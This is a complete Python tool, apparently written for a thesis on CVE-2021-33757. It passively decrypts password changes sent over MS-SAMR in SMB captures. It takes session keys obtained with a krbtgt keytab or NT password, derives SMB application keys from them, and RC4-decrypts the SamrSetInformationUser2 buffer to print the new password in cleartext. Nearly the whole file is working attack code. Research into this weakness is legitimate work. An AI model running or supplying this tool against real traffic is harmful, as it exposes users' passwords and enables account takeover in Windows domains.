#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
samr_decrypt.py
================
Descifrado pasivo del cambio de credenciales sobre MS-SAMR
(SamrSetInformationUser2 / UserInternal4Information, cifrado RC4).

Reproduce la lógica del proyecto PassiveAggression (Hunt & Hackett) en Python,
con fines académicos para la tesis sobre el CVE-2021-33757.

Cadena criptográfica:
    NTLM session key  (ntlmssp.auth.sesskey, del pcap)
        + preauth_hash (smb2.preauth_hash, SMB 3.1.1)   --> ApplicationKey  (SP800-108 / HMAC-SHA256, counter mode)
    ApplicationKey + ClearSalt (16 B, del pcap)         --> RC4key = MD5(ClearSalt || ApplicationKey)
    RC4(RC4key, EncryptedBuffer 516 B)                  --> SAMPR_USER_PASSWORD
        ultimos 4 B (LE) = longitud ; password = los ultimos <longitud> B del bloque de 512, UTF-16LE

Modos:
    manual  -> le pasas los valores en hex (copiados de Wireshark).  SIEMPRE funciona.
    pcap    -> invoca tshark y extrae los campos automaticamente.    Comodidad.

Uso rapido (modo manual):
    python3 samr_decrypt.py manual \
        --ntlm-sesskey  <hex 16B> \
        --preauth       <hex 64B>      (opcional; solo SMB 3.1.1) \
        --info25        <hex 532B>     (o bien: --salt <16B> --enc <516B>)

Validacion (pcap de prueba TEST/pwdreset.pcapng):
    python3 samr_decrypt.py pcap --pcap pwdreset.pcapng --keytab pwdreset.keytab
    debe devolver  New password: Password123!
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import re
import struct
import subprocess
import sys


# --------------------------------------------------------------------------- #
#  Primitivas criptograficas                                                  #
# --------------------------------------------------------------------------- #

def rc4(key: bytes, data: bytes) -> bytes:
    """RC4 estandar (KSA + PRGA), sin descartar bytes iniciales."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)


def kdf_counter_mode(ki: bytes, label: bytes, context: bytes, length_bits: int = 128) -> bytes:
    """
    KDF en modo contador SP800-108 con HMAC-SHA256, tal como lo arma SMB3 / PassiveAggression:
        input = counter(4B BE, =1) || Label || 0x00 || Context || L(4B BE)
    Devuelve los primeros length_bits/8 bytes.
    """
    data = (struct.pack(">I", 1)
            + label
            + b"\x00"
            + context
            + struct.pack(">I", length_bits))
    return hmac.new(ki, data, hashlib.sha256).digest()[: length_bits // 8]


# --------------------------------------------------------------------------- #
#  Derivacion de la ApplicationKey de SMB                                      #
# --------------------------------------------------------------------------- #

def candidate_application_keys(session_keys, preauth_hashes):
    """
    Genera las variantes plausibles de la ApplicationKey para cada clave de sesion
    candidata. Como el dialecto exacto y el preauth correcto pueden no conocerse de
    antemano, se generan varios candidatos y la validacion del payload descifrado
    selecciona el correcto.

    session_keys   : lista de bytes (claves de sesion NTLMSSP candidatas)
    preauth_hashes : lista de bytes (preauth hashes candidatos, SMB 3.1.1)
    Devuelve lista de (descripcion, app_key).
    """
    cands = []
    for sk in session_keys:
        skh = sk.hex()[:8]
        # SMB 3.1.1 -> Label="SMBAppKey\0", Context = preauth integrity hash
        for pre in preauth_hashes:
            cands.append((f"SMB3.1.1 sk={skh} pre={pre.hex()[:8]}",
                          kdf_counter_mode(sk, b"SMBAppKey\x00", pre)))
            cands.append((f"SMB3.1.1(b) sk={skh} pre={pre.hex()[:8]}",
                          kdf_counter_mode(sk, b"SMBAppKey", pre)))
        # SMB 3.0 / 3.0.2 -> Label=SMB2APP, Context=SmbRpc
        cands.append((f"SMB3.0 sk={skh}",
                      kdf_counter_mode(sk, b"SMB2APP\x00", b"SmbRpc\x00")))
        cands.append((f"SMB3.0(b) sk={skh}",
                      kdf_counter_mode(sk, b"SMB2APP", b"SmbRpc")))
        # SMB 2.0 / 2.1 -> sin derivacion
        cands.append((f"SMB2.x sk={skh}", sk))
    return cands


# --------------------------------------------------------------------------- #
#  Descifrado del payload SAMR                                                 #
# --------------------------------------------------------------------------- #

def try_decrypt(app_key: bytes, salt: bytes, enc: bytes):
    """
    Aplica RC4key = MD5(salt || app_key), descifra y trata de extraer la contrasena.
    Devuelve (password:str, length:int) o None si el resultado no es valido.
    """
    rc4_key = hashlib.md5(salt + app_key).digest()
    dec = rc4(rc4_key, enc)                       # SAMPR_USER_PASSWORD (516 B)
    length = struct.unpack("<I", dec[512:516])[0]  # longitud en bytes (LE)

    # Heuristica de validez (estricta, para evitar falsos positivos al escanear):
    # longitud par, 2..256 caracteres, decodifica UTF-16LE y es totalmente imprimible.
    if length < 2 or length > 512 or length % 2 != 0:
        return None
    try:
        pwd = dec[512 - length:512].decode("utf-16-le")
    except UnicodeDecodeError:
        return None
    if not pwd.isprintable():
        return None
    return pwd, length


def locate_and_decrypt(session_keys, preauth_hashes, data, app_key_override=None, verbose=True):
    """
    Localiza el bloque SAMPR_ENCRYPTED_USER_PASSWORD_NEW (532 B) dentro de 'data'
    (que puede ser el contenedor info25_raw completo) y lo descifra.

    Prueba, hasta hallar una contrasena valida:
      - cada offset posible del bloque de 532 bytes dentro de 'data'
      - los dos layouts del bloque:  enc(516)||salt(16)  y  salt(16)||enc(516)
      - cada candidato de ApplicationKey (clave de sesion x preauth x dialecto)

    session_keys / preauth_hashes: listas de bytes.
    Devuelve (password, info_dict) o None.
    """
    if app_key_override is not None:
        app_keys = [("ApplicationKey provista", app_key_override)]
    else:
        app_keys = candidate_application_keys(session_keys, preauth_hashes)

    n = len(data)
    if n < 532:
        return None
    offsets = [0] if n == 532 else range(0, n - 532 + 1)

    for off in offsets:
        block = data[off:off + 532]
        layouts = (
            ("enc||salt", block[:516], block[516:532]),   # MS-SAMR estandar
            ("salt||enc", block[16:532], block[:16]),
        )
        for layout_name, enc, salt in layouts:
            for desc, app_key in app_keys:
                result = try_decrypt(app_key, salt, enc)
                if result:
                    pwd, length = result
                    info = dict(offset=off, layout=layout_name, deriv=desc,
                                app_key=app_key, length=length)
                    if verbose:
                        print(f"[+] Bloque localizado en offset {off}  (layout {layout_name})")
                        print(f"    Derivacion     : {desc}")
                        print(f"    ApplicationKey : {app_key.hex()}")
                        print(f"    RC4 key (MD5)  : {hashlib.md5(salt + app_key).hexdigest()}")
                        print(f"    Longitud pwd   : {length} bytes ({length // 2} caracteres)")
                    return pwd, info
    return None


# --------------------------------------------------------------------------- #
#  Extraccion de campos desde el pcap (via tshark)                            #
# --------------------------------------------------------------------------- #

def _tshark_base(keytab, nt_password):
    cmd = []
    if keytab:
        cmd += ["-o", "kerberos.decrypt:TRUE", "-K", keytab]
    if nt_password:
        cmd += ["-o", f"ntlmssp.nt_password:{nt_password}"]
    return cmd


def _run_tshark(cmd):
    try:
        return subprocess.run(["tshark"] + cmd, capture_output=True,
                              text=True, check=True).stdout
    except FileNotFoundError:
        sys.exit("[-] tshark no esta instalado o no esta en el PATH.")
    except subprocess.CalledProcessError as e:
        sys.exit(f"[-] tshark fallo:\n{e.stderr}")


def run_tshark_jsonraw(pcap, display_filter, keytab=None, nt_password=None):
    cmd = ["-r", pcap, "-Y", display_filter, "-T", "jsonraw"] + _tshark_base(keytab, nt_password)
    out = _run_tshark(cmd)
    return json.loads(out) if out.strip() else []


def run_tshark_fields(pcap, display_filter, fields, keytab=None, nt_password=None):
    """Devuelve lista de filas; cada fila es lista de valores (uno por campo)."""
    cmd = ["-r", pcap, "-Y", display_filter, "-T", "fields"]
    for f in fields:
        cmd += ["-e", f]
    cmd += _tshark_base(keytab, nt_password)
    out = _run_tshark(cmd)
    return [line.split("\t") for line in out.splitlines() if line.strip()]


def session_keys_for_stream(pcap, stream, keytab, nt_password):
    """
    Devuelve las claves de sesion NTLMSSP (bytes) presentes en un tcp.stream dado.
    Wireshark, al descifrar la auth NTLMv2 con el keytab del krbtgt, publica la
    'NTLMSSP SessionKey' (clave exportada, la que usa SMB) en un mensaje experto.
    """
    flt = f"tcp.stream=={stream} && _ws.expert" if stream is not None else "_ws.expert"
    rows = run_tshark_fields(pcap, flt, ["_ws.expert.message"], keytab, nt_password)
    keys = []
    for row in rows:
        for m in re.findall(r"NTLMSSP SessionKey \(([0-9a-fA-F]{32})\)", row[0] if row else ""):
            keys.append(bytes.fromhex(m))
    # Reserva: BaseSessionKey si no hubo key exchange
    if not keys:
        for row in rows:
            for m in re.findall(r"BaseSessionKey \(([0-9a-fA-F]{32})\)", row[0] if row else ""):
                keys.append(bytes.fromhex(m))
    return list(dict.fromkeys(keys))


def preauth_hashes_for_stream(pcap, stream, keytab, nt_password):
    """Preauth integrity hashes (SMB 3.1.1) de un tcp.stream dado."""
    flt = f"tcp.stream=={stream} && smb2.preauth_hash" if stream is not None else "smb2.preauth_hash"
    rows = run_tshark_fields(pcap, flt, ["smb2.preauth_hash"], keytab, nt_password)
    hashes = []
    for row in rows:
        for h in (row[0] if row else "").split(","):
            h = h.strip()
            if len(h) == 128:
                hashes.append(bytes.fromhex(h))
    return list(dict.fromkeys(hashes))


def find_raw_field(obj, target):
    """Busca recursivamente la clave <target> en el arbol JSON de jsonraw y
    devuelve su valor hex (primer elemento del array [hex, pos, size, ...])."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == target and isinstance(v, list) and v:
                return v[0]
            r = find_raw_field(v, target)
            if r:
                return r
    elif isinstance(obj, list):
        for item in obj:
            r = find_raw_field(item, target)
            if r:
                return r
    return None


def extract_from_pcap(pcap, keytab, nt_password):
    print(f"[*] Extrayendo campos de {pcap} con tshark ...")

    # 1) Localizar el cambio de contrasena: frame + tcp.stream (opnum 58).
    samr_rows = run_tshark_fields(pcap, "samr.opnum==58", ["frame.number", "tcp.stream"],
                                  keytab, nt_password)
    if not samr_rows:
        sys.exit("[-] No se encontro SamrSetInformationUser2 (opnum 58) en el pcap.")
    frame = samr_rows[0][0]
    stream = samr_rows[0][1] if len(samr_rows[0]) > 1 and samr_rows[0][1] else None
    print(f"    SAMR setinfo       : frame {frame}, tcp.stream {stream}")

    # 2) Contenedor info25_raw de ESE frame (evita mezclar varios cambios).
    j = run_tshark_jsonraw(pcap, f"frame.number=={frame}", keytab, nt_password)
    container = find_raw_field(j, "samr.samr_UserInfo.info25_raw") \
        or find_raw_field(j, "samr.samr_UserInfo25.password_raw")

    # 3) Claves de sesion y preauth hashes DEL MISMO stream (correlacion correcta).
    session_keys = session_keys_for_stream(pcap, stream, keytab, nt_password)
    preauths = preauth_hashes_for_stream(pcap, stream, keytab, nt_password)
    # Reserva: si no hubo correlacion por stream, usar todo el capture.
    if not session_keys:
        session_keys = session_keys_for_stream(pcap, None, keytab, nt_password)
    if not preauths:
        preauths = preauth_hashes_for_stream(pcap, None, keytab, nt_password)

    print(f"    claves de sesion   : {len(session_keys)}  ({', '.join(k.hex()[:8] for k in session_keys[:4])}{'...' if len(session_keys) > 4 else ''})")
    print(f"    preauth hashes     : {len(preauths)}")
    print(f"    info25 container   : {('(' + str(len(container) // 2) + ' bytes)') if container else None}")

    if not session_keys:
        sys.exit("[-] No se obtuvo ninguna clave de sesion. Verifica el --keytab "
                 "(o pasa --nt-password si la auth es NTLM sin keytab del krbtgt).")
    if not container:
        sys.exit("[-] No se encontro info25 (UserInternal4). Verifica que el cambio "
                 "se hizo via SamrSetInformationUser2 / UserInternal4Information.")

    return (session_keys,
            preauths,
            bytes.fromhex(container))


# --------------------------------------------------------------------------- #
#  CLI                                                                         #
# --------------------------------------------------------------------------- #

def hexarg(s):
    return bytes.fromhex(s.replace(" ", "").replace(":", ""))


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="mode", required=True)

    m = sub.add_parser("manual", help="Descifrar con valores en hex copiados de Wireshark")
    m.add_argument("--ntlm-sesskey", "--session-key", dest="ntlm_sesskey", type=hexarg,
                   help="Clave de sesion SMB (ntlmssp.auth.sesskey o keyline Kerberos, 16 B)")
    m.add_argument("--app-key", type=hexarg,
                   help="ApplicationKey de SMB ya derivada (16 B). Omite la derivacion.")
    m.add_argument("--preauth", type=hexarg, help="smb2.preauth_hash (SMB 3.1.1)")
    m.add_argument("--info25", dest="info25", type=hexarg,
                   help="Contenedor samr.samr_UserInfo.info25_raw (se escanea el bloque de 532 B)")
    m.add_argument("--salt", type=hexarg, help="ClearSalt (16 B), si no usas --info25")
    m.add_argument("--enc", type=hexarg, help="Buffer cifrado (516 B), si no usas --info25")

    c = sub.add_parser("pcap", help="Extraer campos del pcap con tshark y descifrar")
    c.add_argument("--pcap", required=True)
    c.add_argument("--keytab", help="keytab Kerberos (tshark -K)")
    c.add_argument("--nt-password",
                   help="Contrasena de la cuenta autenticadora (para descifrar NTLM en tshark)")

    args = p.parse_args()

    if args.mode == "manual":
        if args.info25:
            data = args.info25
        elif args.salt and args.enc:
            data = args.enc + args.salt          # bloque de 532 B (enc||salt)
        else:
            sys.exit("[-] Falta el payload: usa --info25 (contenedor) o --salt + --enc.")
        if not args.app_key and not args.ntlm_sesskey:
            sys.exit("[-] Falta la clave: usa --ntlm-sesskey/--session-key o --app-key.")
        session_keys = [args.ntlm_sesskey] if args.ntlm_sesskey else []
        preauths = [args.preauth] if args.preauth else []
        app_key_override = args.app_key

    else:  # pcap
        session_keys, preauths, data = extract_from_pcap(
            args.pcap, args.keytab, args.nt_password)
        app_key_override = None

    print()
    result = locate_and_decrypt(session_keys, preauths, data,
                                app_key_override=app_key_override)
    print()
    if result is None:
        print("[-] No se pudo descifrar una contrasena valida.")
        print("    Revisa: clave de sesion correcta y que el cambio use UserInternal4 (RC4).")
        sys.exit(1)
    pwd, info = result
    print(f"[+] offset={info['offset']} layout={info['layout']} deriv={info['deriv']}")
    print("=" * 50)
    print(f"  New password: {pwd}")
    print("=" * 50)


if __name__ == "__main__":
    main()
